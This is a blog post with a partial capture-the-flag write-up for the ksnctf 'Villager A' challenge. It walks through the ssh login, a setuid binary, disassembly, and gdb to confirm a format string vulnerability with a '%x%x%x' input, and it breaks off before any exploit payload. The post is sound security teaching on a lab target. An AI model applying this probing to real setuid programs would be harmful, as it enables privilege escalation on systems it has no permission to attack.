---
layout: post
title: ksnctf Villager A write-up
---

![placeholder](../image/vil_a.png "Large example image")
[ksnctf](http://ksnctf.sweetduet.info) is one of the beginner level CTF websites. This article is the write-up for the question 4 [Villager A](http://ksnctf.sweetduet.info/problem/4), in which you need to exploit the *Format String Vulnerability* to capture the flag!  

### Write-up
1. *Connect*  
Using given information, access to the server `ssh -p 10022 q4@ctfq.sweetduet.info`  
In the server, you can find
```
[q4@localhost ~]$ ls -al
total 36
drwxr-xr-x.  2 root root 4096 May 22  2012 .
drwxr-xr-x. 17 root root 4096 Oct  6  2014 ..
-rw-r--r--.  1 root root   18 Dec  2  2011 .bash_logout
-rw-r--r--.  1 root root  176 Dec  2  2011 .bash_profile
-rw-r--r--.  1 root root  124 Dec  2  2011 .bashrc
-r--------.  2 q4a  q4a    22 May 22  2012 flag.txt
-rwsr-xr-x.  1 q4a  q4a  5857 May 22  2012 q4
-rw-r--r--.  1 root root  151 Jun  1  2012 readme.txt
[q4@localhost ~]$ cat readme.txt 
You are not allowed to connect internet and write the home directory.
If you need temporary directory, use /tmp.
Sometimes this machine will be reset.
[q4@localhost ~]$ cat flag.txt
cat: flag.txt: Permission denied
[q4@localhost ~]$ ./q4 
What's your name?
sirius
Hi, sirius

Do you want the flag?
yes
Do you want the flag?
yes
Do you want the flag?
no
I see. Good bye.
```

Since I don't have an access to read flag.txt, it seems that I need to somehow exploit q4 (SUID=root) to read the file.  
Let's disassemble.  

```
...
0x080485e4 <+48>:	call   0x8048484 <fgets@plt>
0x080485e9 <+53>:	mov    DWORD PTR [esp],0x80487b6
0x080485f0 <+60>:	call   0x80484b4 <printf@plt>
0x080485f5 <+65>:	lea    eax,[esp+0x18]
0x080485f9 <+69>:	mov    DWORD PTR [esp],eax
0x080485fc <+72>:	call   0x80484b4 <printf@plt>
0x08048601 <+77>:	mov    DWORD PTR [esp],0xa
0x08048608 <+84>:	call   0x8048474 <putchar@plt>
0x0804860d <+89>:	mov    DWORD PTR [esp+0x418],0x1
0x08048618 <+100>:	jmp    0x8048681 <main+205>
0x0804861a <+102>:	mov    DWORD PTR [esp],0x80487bb
0x08048621 <+109>:	call   0x80484c4 <puts@plt>
...
```
```
(gdb) c
Continuing.
What's your name?

Breakpoint 2, 0x080485e4 in main ()
(gdb) nexti
hello
0x080485e9 in main ()
(gdb) x/s 0x80487b6
0x80487b6 <__dso_handle+22>:	 "Hi, "
(gdb) x/s $esp+0x18
0xbf9524d8:	 "hello\n"
```
It seems that at \<main+48\>, `fgets()` is called to take string from stdin, and at \<main+72\>, `printf()` is called to output the string. But, it's weird that `printf()` was called at \<main+60\> to output "Hi, ", and after that, `putchar()` was called to output "\n", instead of calling something like `printf("Hi, %s\n", input);` as you usually write. Now, I'm getting suspicious that there is a format string vulnerability in this program.  
What if I input *format string* at \<main+48\>?  

```
[q4@localhost ~]$ ./q4
What's your name?
sirius%x%x%x
Hi, sirius400d604408

Do you want the flag?
```

It's now clear that there is a format string vulnerability in this program. So, let's think about how to exploit it to read flag.txt.  
